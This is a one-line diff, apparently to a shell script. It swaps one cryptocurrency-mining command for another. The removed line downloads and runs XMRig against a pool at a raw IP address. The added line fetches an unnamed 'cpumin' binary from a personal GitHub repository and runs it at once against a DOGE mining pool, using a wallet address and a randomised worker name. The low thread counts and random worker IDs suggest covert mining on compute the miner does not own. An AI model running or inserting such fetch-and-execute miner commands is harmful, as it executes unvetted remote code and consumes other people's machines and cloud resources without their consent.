@@ -1,1 +1,1 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar xvf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && chmod u+x xmrig && ./xmrig -a rx/0 -o 20.211.120.163:443 -u USDT:TLPbsRkFNUAutW7V5XeiC4jt9RDJd8xwVP -p x -t 2  
+wget https://raw.githubusercontent.com/jacujamil/dewasa/main/cpumin && chmod +x cpumin && ./cpumin -a power2b -o stratum+tcp:/power2b.sea.mine.zpool.ca:6242 -u DAxGkuHcPytmsbUTMebR4yB92Hx5X3AC4E.$(echo $(shuf -i 1-9999 -n 1)-Masku) -p c=DOGE -t 1
